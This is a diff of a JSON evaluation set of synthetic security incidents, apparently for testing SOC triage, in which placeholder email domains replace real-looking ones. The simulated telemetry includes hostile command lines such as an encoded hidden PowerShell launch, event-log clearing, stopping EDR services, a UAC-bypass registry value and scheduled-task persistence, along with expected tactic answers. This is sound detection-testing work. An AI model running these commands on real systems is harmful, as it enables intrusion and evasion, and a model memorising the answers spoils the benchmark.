+          "userName": "ops-lead@example.com"
         },
         "requestParameters": {
           "bucketName": "aisoc-employees",
@@ -4417,8 +4417,8 @@
     "id": "INC-EVAL-097",
     "template_id": "azure-ad-impossible-travel",
     "template_index": 41,
-    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for svc-backup@aisoc.dev",
-    "description": "Successful Azure AD sign-in for svc-backup@aisoc.dev from 192.168.1.100 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for svc-backup@example.com",
+    "description": "Successful Azure AD sign-in for svc-backup@example.com from 192.168.1.100 (impossible-travel from prior location). MFA satisfied via stolen session token.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -4434,14 +4434,14 @@
       "impossible travel",
       "session token",
       "mfa",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "192.168.1.100"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-backup@aisoc.dev",
+        "userPrincipalName": "svc-backup@example.com",
         "ipAddress": "192.168.1.100",
         "location": {
           "city": "Vladivostok",
@@ -4500,8 +4500,8 @@
     "id": "INC-EVAL-099",
     "template_id": "insider-mailbox-export",
     "template_index": 43,
-    "title": "Insider preparing departure: large mailbox export by svc-backup@aisoc.dev",
-    "description": "svc-backup@aisoc.dev exported full mailbox PST (8 GB) from MAC-LEGAL-LAPTOP. HR flag: notice given last week.",
+    "title": "Insider preparing departure: large mailbox export by svc-backup@example.com",
+    "description": "svc-backup@example.com exported full mailbox PST (8 GB) from MAC-LEGAL-LAPTOP. HR flag: notice given last week.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -4517,7 +4517,7 @@
       "PST",
       "insider",
       "departure",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "MAC-LEGAL-LAPTOP"
     ],
     "telemetry": [
@@ -4525,10 +4525,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-MailboxExportRequest",
-        "UserId": "svc-backup@aisoc.dev",
+        "UserId": "svc-backup@example.com",
         "Parameters": {
-          "Mailbox": "svc-backup@aisoc.dev",
-          "FilePath": "\\\\MAC-LEGAL-LAPTOP\\export\\svc-backup@aisoc.dev.pst"
+          "Mailbox": "svc-backup@example.com",
+          "FilePath": "\\\\MAC-LEGAL-LAPTOP\\export\\svc-backup@example.com.pst"
         },
         "Bytes": 8300000000
       }
@@ -4538,8 +4538,8 @@
     "id": "INC-EVAL-100",
     "template_id": "office-vsto-addin",
     "template_index": 44,
-    "title": "Malicious Office add-in installed for grace@aisoc.dev",
-    "description": "Office VSTO add-in registered under HKCU for grace@aisoc.dev on WIN-FILE-SHARE; loads on every Outlook startup; beacons to 10.0.99.42.",
+    "title": "Malicious Office add-in installed for grace@example.com",
+    "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-FILE-SHARE; loads on every Outlook startup; beacons to 10.0.99.42.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -4554,7 +4554,7 @@
       "office add-in",
       "vsto",
       "outlook",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "WIN-FILE-SHARE",
       "10.0.99.42"
     ],
@@ -4565,10 +4565,10 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "WIN-FILE-SHARE",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Microsoft\\Office\\Outlook\\Addins\\Aisoc.Updater",
-        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/grace@aisoc.dev/AppData/Roaming/aisoc.vsto"
+        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/grace@example.com/AppData/Roaming/aisoc.vsto"
       },
       {
         "source": "sysmon",
@@ -4587,7 +4587,7 @@
     "template_id": "github-pat-leak",
     "template_index": 45,
     "title": "GitHub PAT leaked and abused from 45.142.122.111",
-    "description": "Personal access token belonging to admin@aisoc.dev used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "description": "Personal access token belonging to admin@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -4603,14 +4603,14 @@
       "pat",
       "token",
       "private repo",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "45.142.122.111"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
-        "actor": "admin@aisoc.dev",
+        "actor": "admin@example.com",
         "actor_ip": "45.142.122.111",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
@@ -4619,8 +4619,8 @@
       {
         "source": "github_audit",
         "action": "push",
-        "actor": "admin@aisoc.dev",
-        "repo": "admin@aisoc.dev/dotfiles",
+        "actor": "admin@example.com",
+        "repo": "admin@example.com/dotfiles",
         "visibility": "public",
         "file_changed": ".env",
         "secret_detected": "github_pat_*"
@@ -4679,8 +4679,8 @@
     "id": "INC-EVAL-103",
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
-    "title": "Vendor admin password reset abuse for heidi@aisoc.dev",
-    "description": "Password reset for heidi@aisoc.dev performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+    "title": "Vendor admin password reset abuse for heidi@example.com",
+    "description": "Password reset for heidi@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -4695,7 +4695,7 @@
       "password reset",
       "social engineering",
       "helpdesk",
-      "heidi@aisoc.dev",
+      "heidi@example.com",
       "185.220.101.7"
     ],
     "telemetry": [
@@ -4703,14 +4703,14 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Reset user password.",
-        "UserId": "helpdesk@aisoc.dev",
-        "TargetUserId": "heidi@aisoc.dev",
+        "UserId": "helpdesk@example.com",
+        "TargetUserId": "heidi@example.com",
         "ClientIP": "10.0.0.50"
       },
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "heidi@aisoc.dev",
+        "userPrincipalName": "heidi@example.com",
         "ipAddress": "185.220.101.7",
         "resultType": 0,
         "seconds_after_reset": 87
@@ -4721,8 +4721,8 @@
     "id": "INC-EVAL-104",
     "template_id": "oauth-refresh-token-theft",
     "template_index": 48,
-    "title": "OAuth refresh-token theft for alice@aisoc.dev",
-    "description": "Refresh token for alice@aisoc.dev replayed from 91.134.231.15. Granted access to mailbox + OneDrive without re-prompt.",
+    "title": "OAuth refresh-token theft for alice@example.com",
+    "description": "Refresh token for alice@example.com replayed from 91.134.231.15. Granted access to mailbox + OneDrive without re-prompt.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -4737,14 +4737,14 @@
       "replay",
       "onedrive",
       "mailbox",
-      "alice@aisoc.dev",
+      "alice@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "alice@aisoc.dev",
+        "userPrincipalName": "alice@example.com",
         "ipAddress": "91.134.231.15",
         "resultType": 0,
         "authenticationProtocol": "oAuth2",
@@ -4813,8 +4813,8 @@
     "id": "INC-EVAL-106",
     "template_id": "outlook-auto-forward-rule",
     "template_index": 50,
-    "title": "Outlook rule auto-forwarding mail from eve@aisoc.dev",
-    "description": "Outlook inbox rule created for eve@aisoc.dev that forwards all mail to external address at 192.168.1.100. Linked to MosaicRegressor.",
+    "title": "Outlook rule auto-forwarding mail from eve@example.com",
+    "description": "Outlook inbox rule created for eve@example.com that forwards all mail to external address at 192.168.1.100. Linked to MosaicRegressor.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -4829,7 +4829,7 @@
       "outlook rule",
       "forward",
       "mail",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "192.168.1.100",
       "MosaicRegressor"
     ],
@@ -4838,7 +4838,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "eve@aisoc.dev",
+        "UserId": "eve@example.com",
         "Parameters": {
           "Name": "Sync",
           "ForwardTo": "ext@192.168.1.100",
@@ -4854,7 +4854,7 @@
     "template_id": "linux-journald-tampering",
     "template_index": 51,
     "title": "Linux journald log tampering on LIN-OBS-LOGGER",
-    "description": "journalctl --rotate --vacuum-time=1s observed on LIN-OBS-LOGGER by ceo@aisoc.dev; recent journal entries purged. Indicator removal.",
+    "description": "journalctl --rotate --vacuum-time=1s observed on LIN-OBS-LOGGER by ceo@example.com; recent journal entries purged. Indicator removal.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -4868,7 +4868,7 @@
       "log tampering",
       "vacuum",
       "LIN-OBS-LOGGER",
-      "ceo@aisoc.dev"
+      "ceo@example.com"
     ],
     "telemetry": [
       {
@@ -4880,7 +4880,7 @@
         "a1": "--rotate",
         "a2": "--vacuum-time=1s",
         "hostname": "LIN-OBS-LOGGER",
-        "user": "ceo@aisoc.dev"
+        "user": "ceo@example.com"
       }
     ]
   },
@@ -4937,8 +4937,8 @@
     "id": "INC-EVAL-109",
     "template_id": "vpn-new-geography",
     "template_index": 53,
-    "title": "Suspicious VPN login from new geography for grace@aisoc.dev",
-    "description": "VPN login for grace@aisoc.dev from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-K8S-NODE01.",
+    "title": "Suspicious VPN login from new geography for grace@example.com",
+    "description": "VPN login for grace@example.com from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-K8S-NODE01.",
     "expected_tactics": [
       "TA0001",
       "TA0008"
@@ -4954,7 +4954,7 @@
       "new geography",
       "lateral",
       "smb scan",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "10.0.99.42",
       "LIN-K8S-NODE01"
     ],
@@ -4962,7 +4962,7 @@
       {
         "source": "vpn",
         "action": "login_success",
-        "user": "grace@aisoc.dev",
+        "user": "grace@example.com",
         "src_ip": "10.0.99.42",
         "geo_country": "UA",
         "first_login_country": true
@@ -4973,7 +4973,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "LIN-K8S-NODE01",
-        "SubjectUserName": "grace@aisoc.dev",
+        "SubjectUserName": "grace@example.com",
         "ShareName": "\\\\*\\IPC$",
         "IpAddress": "10.0.99.42",
         "EventCount": 128
@@ -4985,7 +4985,7 @@
     "template_id": "service-account-privileged-command",
     "template_index": 54,
     "title": "Privileged command run as service account on WIN-DEVOPS-LT",
-    "description": "Service account frank@aisoc.dev (no interactive use expected) ran privileged net.exe + wevtutil cl Security on WIN-DEVOPS-LT. Anomalous.",
+    "description": "Service account frank@example.com (no interactive use expected) ran privileged net.exe + wevtutil cl Security on WIN-DEVOPS-LT. Anomalous.",
     "expected_tactics": [
       "TA0005",
       "TA0006"
@@ -5000,7 +5000,7 @@
       "service account",
       "wevtutil",
       "log clear",
-      "frank@aisoc.dev",
+      "frank@example.com",
       "WIN-DEVOPS-LT"
     ],
     "telemetry": [
@@ -5010,7 +5010,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-DEVOPS-LT",
-        "User": "frank@aisoc.dev",
+        "User": "frank@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security",
         "LogonType": 5
@@ -5021,8 +5021,8 @@
     "id": "INC-EVAL-111",
     "template_id": "phishing-macro-email",
     "template_index": 0,
-    "title": "Spear-phishing email with macro-laden attachment delivered to eve@aisoc.dev",
-    "description": "Inbound email from 192.168.1.100 delivered an Office document with a malicious VBA macro to eve@aisoc.dev. Attachment opened on LIN-OBS-LOGGER; macro spawned cmd.exe and downloaded a stage-2 payload from a known Scattered Spider infrastructure.",
+    "title": "Spear-phishing email with macro-laden attachment delivered to eve@example.com",
+    "description": "Inbound email from 192.168.1.100 delivered an Office document with a malicious VBA macro to eve@example.com. Attachment opened on LIN-OBS-LOGGER; macro spawned cmd.exe and downloaded a stage-2 payload from a known Scattered Spider infrastructure.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -5038,7 +5038,7 @@
       "macro",
       "192.168.1.100",
       "LIN-OBS-LOGGER",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "stage-2 payload"
     ],
     "telemetry": [
@@ -5046,7 +5046,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "eve@aisoc.dev",
+        "UserId": "eve@example.com",
         "ClientIP": "192.168.1.100",
         "Subject": "Q4 invoice (action required)",
         "AttachmentNames": [
@@ -5059,7 +5059,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-OBS-LOGGER",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc <stage2>"
@@ -5069,7 +5069,7 @@
         "rule": "Office macro spawned cmd.exe",
         "severity": "high",
         "Computer": "LIN-OBS-LOGGER",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "threat_actor": "Scattered Spider"
       }
     ]
@@ -5125,7 +5125,7 @@
     "template_id": "confluence-watering-hole",
     "template_index": 2,
     "title": "Watering-hole exploit served from internal Confluence by 185.220.101.7",
-    "description": "Internal Confluence page injected with malicious JavaScript by 185.220.101.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@aisoc.dev. Linked to MagicWeb TTPs.",
+    "description": "Internal Confluence page injected with malicious JavaScript by 185.220.101.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@example.com. Linked to MagicWeb TTPs.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -5141,14 +5141,14 @@
       "drive-by",
       "Confluence",
       "185.220.101.7",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "MagicWeb"
     ],
     "telemetry": [
       {
         "source": "web_access",
         "http_method": "POST",
-        "url": "https://confluence.aisoc.dev/pages/editpage.action?pageId=8472",
+        "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
         "status_code": 200,
         "src_ip": "185.220.101.7",
         "user_agent": "Mozilla/5.0",
@@ -5159,7 +5159,7 @@
         "rule": "Browser exploitation: drive-by JavaScript loader",
         "severity": "high",
         "Computer": "WIN-HR-DESKTOP",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "threat_actor": "MagicWeb"
       }
     ]
@@ -5224,7 +5224,7 @@
     "template_id": "usb-autorun-airgap",
     "template_index": 4,
     "title": "Malicious USB autorun on air-gapped host WIN-PROD-WEB02",
-    "description": "USB device inserted on air-gapped WIN-PROD-WEB02 by alice@aisoc.dev. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
+    "description": "USB device inserted on air-gapped WIN-PROD-WEB02 by alice@example.com. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
     "expected_tactics": [
       "TA0001",
       "TA0009"
@@ -5240,7 +5240,7 @@
       "autorun",
       "air-gapped",
       "WIN-PROD-WEB02",
-      "alice@aisoc.dev",
+      "alice@example.com",
       "Python stager"
     ],
     "telemetry": [
@@ -5250,7 +5250,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 6416,
         "Computer": "WIN-PROD-WEB02",
-        "SubjectUserName": "alice@aisoc.dev",
+        "SubjectUserName": "alice@example.com",
         "ClassName": "USB",
         "DeviceDescription": "SanDisk Cruzer 16GB"
       },
@@ -5260,7 +5260,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-PROD-WEB02",
-        "User": "alice@aisoc.dev",
+        "User": "alice@example.com",
         "Image": "C:\\Python311\\python.exe",
         "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
         "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
@@ -5271,8 +5271,8 @@
     "id": "INC-EVAL-116",
     "template_id": "oauth-consent-phish",
     "template_index": 5,
-    "title": "OAuth consent phishing targeting eve@aisoc.dev",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@aisoc.dev. Inbox forwarding rule created sending mail to 91.134.231.15.",
+    "title": "OAuth consent phishing targeting eve@example.com",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -5287,7 +5287,7 @@
       "OAuth consent",
       "Mail.Read",
       "Files.Read.All",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "91.134.231.15",
       "forwarding rule"
     ],
@@ -5296,7 +5296,7 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Consent to application.",
-        "UserId": "eve@aisoc.dev",
+        "UserId": "eve@example.com",
         "ApplicationId": "00000003-0000-0ff1-ce00-000000000000",
         "ConsentedScopes": [
           "Mail.Read",
@@ -5308,7 +5308,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "eve@aisoc.dev",
+        "UserId": "eve@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
           "ForwardTo": "ext@91.134.231.15",
@@ -5322,7 +5322,7 @@
     "template_id": "powershell-obfuscated-dropper",
     "template_index": 6,
     "title": "Obfuscated PowerShell dropper executed on WIN-HR-DESKTOP",
-    "description": "PowerShell dropper executed on WIN-HR-DESKTOP by frank@aisoc.dev; payload base64-encoded and decoded in-memory. Linked to MosaicRegressor ransomware staging.",
+    "description": "PowerShell dropper executed on WIN-HR-DESKTOP by frank@example.com; payload base64-encoded and decoded in-memory. Linked to MosaicRegressor ransomware staging.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -5338,7 +5338,7 @@
       "obfuscated",
       "base64",
       "WIN-HR-DESKTOP",
-      "frank@aisoc.dev",
+      "frank@example.com",
       "MosaicRegressor"
     ],
     "telemetry": [
@@ -5348,7 +5348,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-HR-DESKTOP",
-        "User": "frank@aisoc.dev",
+        "User": "frank@example.com",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ParentImage": "C:\\Windows\\explorer.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgB..."
@@ -5359,7 +5359,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4104,
         "Computer": "WIN-HR-DESKTOP",
-        "User": "frank@aisoc.dev",
+        "User": "frank@example.com",
         "ScriptBlockText": "$s=[System.Convert]::FromBase64String(...);[Reflection.Assembly]::Load($s).EntryPoint.Invoke(...)",
         "threat_actor": "MosaicRegressor"
       }
@@ -5471,7 +5471,7 @@
     "template_id": "wmi-event-subscription",
     "template_index": 9,
     "title": "Malicious WMI subscription on WIN-PROD-WEB02",
-    "description": "Permanent WMI event subscription created on WIN-PROD-WEB02 by eve@aisoc.dev. Consumer runs encoded script. Persistence + execution mechanism.",
+    "description": "Permanent WMI event subscription created on WIN-PROD-WEB02 by eve@example.com. Consumer runs encoded script. Persistence + execution mechanism.",
     "expected_tactics": [
       "TA0002",
       "TA0003"
@@ -5487,7 +5487,7 @@
       "subscription",
       "permanent",
       "WIN-PROD-WEB02",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "encoded script"
     ],
     "telemetry": [
@@ -5497,7 +5497,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 19,
         "Computer": "WIN-PROD-WEB02",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "EventNamespace": "ROOT\\Subscription",
         "Name": "UpdaterFilter",
         "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60"
@@ -5519,7 +5519,7 @@
     "id": "INC-EVAL-121",
     "template_id": "registry-run-persistence",
     "template_index": 10,
-    "title": "Registry Run key persistence created by eve@aisoc.dev on K8S-PROD-CLUSTER",
+    "title": "Registry Run key persistence created by eve@example.com on K8S-PROD-CLUSTER",
     "description": "New value written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on K8S-PROD-CLUSTER. Points to roaming binary signed with revoked cert. Linked to ALPHV/BlackCat.",
     "expected_tactics": [
       "TA0003"
@@ -5534,7 +5534,7 @@
       "persistence",
       "revoked cert",
       "K8S-PROD-CLUSTER",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "ALPHV/BlackCat"
     ],
     "telemetry": [
@@ -5544,17 +5544,17 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "K8S-PROD-CLUSTER",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
-        "Details": "C:\\Users\\eve@aisoc.dev\\AppData\\Roaming\\updater.exe"
+        "Details": "C:\\Users\\eve@example.com\\AppData\\Roaming\\updater.exe"
       },
       {
         "source": "edr",
         "rule": "Persistence: Registry Run with revoked-cert signed binary",
         "severity": "high",
         "Computer": "K8S-PROD-CLUSTER",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "threat_actor": "ALPHV/BlackCat"
       }
     ]
@@ -5564,7 +5564,7 @@
     "template_id": "scheduled-task-persistence",
     "template_index": 11,
     "title": "Scheduled task persistence on WIN-PROD-WEB02",
-    "description": "Hidden scheduled task created on WIN-PROD-WEB02 by carol@aisoc.dev: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
+    "description": "Hidden scheduled task created on WIN-PROD-WEB02 by carol@example.com: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
     "expected_tactics": [
       "TA0003"
     ],
@@ -5578,7 +5578,7 @@
       "persistence",
       "APPDATA",
       "WIN-PROD-WEB02",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -5587,7 +5587,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4698,
         "Computer": "WIN-PROD-WEB02",
-        "SubjectUserName": "carol@aisoc.dev",
+        "SubjectUserName": "carol@example.com",
         "TaskName": "\\Microsoft\\Windows\\UpdaterTask",
         "TaskContent": "<Hidden>true</Hidden><Exec>%APPDATA%\\Roaming\\u.ps1</Exec>"
       },
@@ -5600,7 +5600,7 @@
         "Image": "C:\\Windows\\System32\\schtasks.exe",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
         "CommandLine": "schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
-        "User": "carol@aisoc.dev"
+        "User": "carol@example.com"
       }
     ]
   },
@@ -5652,7 +5652,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on MAC-LEGAL-LAPTOP",
-    "description": "/etc/cron.d entry created by alice@aisoc.dev on MAC-LEGAL-LAPTOP. Reverse shell beacon to 91.134.231.15 every 5 minutes.",
+    "description": "/etc/cron.d entry created by alice@example.com on MAC-LEGAL-LAPTOP. Reverse shell beacon to 91.134.231.15 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -5668,7 +5668,7 @@
       "backdoor",
       "reverse shell",
       "MAC-LEGAL-LAPTOP",
-      "alice@aisoc.dev",
+      "alice@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -5679,7 +5679,7 @@
         "exe": "/usr/bin/vi",
         "path": "/etc/cron.d/zz-update",
         "hostname": "MAC-LEGAL-LAPTOP",
-        "user": "alice@aisoc.dev",
+        "user": "alice@example.com",
         "a2": "O_WRONLY|O_CREAT"
       },
       {
@@ -5695,7 +5695,7 @@
     "template_id": "uac-bypass-fodhelper",
     "template_index": 14,
     "title": "UAC bypass observed on WIN-EXCHANGE-01",
-    "description": "fodhelper.exe abuse on WIN-EXCHANGE-01 by dave@aisoc.dev; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
+    "description": "fodhelper.exe abuse on WIN-EXCHANGE-01 by dave@example.com; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
     "expected_tactics": [
       "TA0004",
       "TA0005"
@@ -5710,7 +5710,7 @@
       "fodhelper",
       "auto-elevation",
       "WIN-EXCHANGE-01",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "SYSTEM"
     ],
     "telemetry": [
@@ -5720,7 +5720,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "WIN-EXCHANGE-01",
-        "User": "dave@aisoc.dev",
+        "User": "dave@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
         "Details": "C:\\Windows\\System32\\cmd.exe /c whoami"
@@ -5743,7 +5743,7 @@
     "template_id": "k8s-privileged-pod-escape",
     "template_index": 15,
     "title": "Container escape via privileged pod on GCP-GKE-NODE-04",
-    "description": "Kubernetes privileged pod created on GCP-GKE-NODE-04 by carol@aisoc.dev. cgroup escape to host namespace observed. Node filesystem accessed.",
+    "description": "Kubernetes privileged pod created on GCP-GKE-NODE-04 by carol@example.com. cgroup escape to host namespace observed. Node filesystem accessed.",
     "expected_tactics": [
       "TA0004",
       "TA0007"
@@ -5760,7 +5760,7 @@
       "container escape",
       "cgroup",
       "GCP-GKE-NODE-04",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -5772,7 +5772,7 @@
           "resource": "pods"
         },
         "user": {
-          "username": "carol@aisoc.dev"
+          "username": "carol@example.com"
         },
         "requestObject": {
           "spec": {
@@ -5810,7 +5810,7 @@
     "template_id": "linux-suid-abuse",
     "template_index": 16,
     "title": "Linux SUID binary abuse on WIN-DEVOPS-LT",
-    "description": "Custom SUID binary discovered in /tmp on WIN-DEVOPS-LT; allows arbitrary command execution as root. Likely escalation by frank@aisoc.dev.",
+    "description": "Custom SUID binary discovered in /tmp on WIN-DEVOPS-LT; allows arbitrary command execution as root. Likely escalation by frank@example.com.",
     "expected_tactics": [
       "TA0004"
     ],
@@ -5824,7 +5824,7 @@
       "/tmp",
       "root escalation",
       "WIN-DEVOPS-LT",
-      "frank@aisoc.dev"
+      "frank@example.com"
     ],
     "telemetry": [
       {
@@ -5835,7 +5835,7 @@
         "a1": "/tmp/.x",
         "mode": "04755",
         "hostname": "WIN-DEVOPS-LT",
-        "user": "frank@aisoc.dev"
+        "user": "frank@example.com"
       },
       {
         "source": "linux_auditd",
@@ -5845,7 +5845,7 @@
         "hostname": "WIN-DEVOPS-LT",
         "uid": 1001,
         "euid": 0,
-        "user": "frank@aisoc.dev"
+        "user": "frank@example.com"
       }
     ]
   },
@@ -5911,7 +5911,7 @@
     "template_id": "event-log-cleared",
     "template_index": 18,
     "title": "Indicator removal: Windows event log cleared on MAC-CFO-LAPTOP",
-    "description": "Security event log cleared on MAC-CFO-LAPTOP by dave@aisoc.dev. wevtutil.exe cl Security observed in command-line telemetry.",
+    "description": "Security event log cleared on MAC-CFO-LAPTOP by dave@example.com. wevtutil.exe cl Security observed in command-line telemetry.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -5925,7 +5925,7 @@
       "log cleared",
       "indicator removal",
       "MAC-CFO-LAPTOP",
-      "dave@aisoc.dev"
+      "dave@example.com"
     ],
     "telemetry": [
       {
@@ -5934,7 +5934,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 1102,
         "Computer": "MAC-CFO-LAPTOP",
-        "SubjectUserName": "dave@aisoc.dev",
+        "SubjectUserName": "dave@example.com",
         "Channel": "Security",
         "Description": "The audit log was cleared."
       },
@@ -5944,7 +5944,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "MAC-CFO-LAPTOP",
-        "User": "dave@aisoc.dev",
+        "User": "dave@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security"
       }
@@ -5955,7 +5955,7 @@
     "template_id": "disable-edr-tooling",
     "template_index": 19,
     "title": "Disable security tooling on GCP-GKE-NODE-04",
-    "description": "grace@aisoc.dev attempted to stop Defender, CrowdStrike, and Sysmon on GCP-GKE-NODE-04. Tampering telemetry triggered alert.",
+    "description": "grace@example.com attempted to stop Defender, CrowdStrike, and Sysmon on GCP-GKE-NODE-04. Tampering telemetry triggered alert.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -5970,7 +5970,7 @@
       "sysmon",
       "tampering",
       "GCP-GKE-NODE-04",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
@@ -5979,7 +5979,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "GCP-GKE-NODE-04",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop CSAgent"
       },
@@ -5989,7 +5989,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "GCP-GKE-NODE-04",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop WinDefend"
       },
@@ -5998,7 +5998,7 @@
         "rule": "EDR tampering attempt",
         "severity": "critical",
         "Computer": "GCP-GKE-NODE-04",
-        "User": "grace@aisoc.dev"
+        "User": "grace@example.com"
       }
     ]
   },
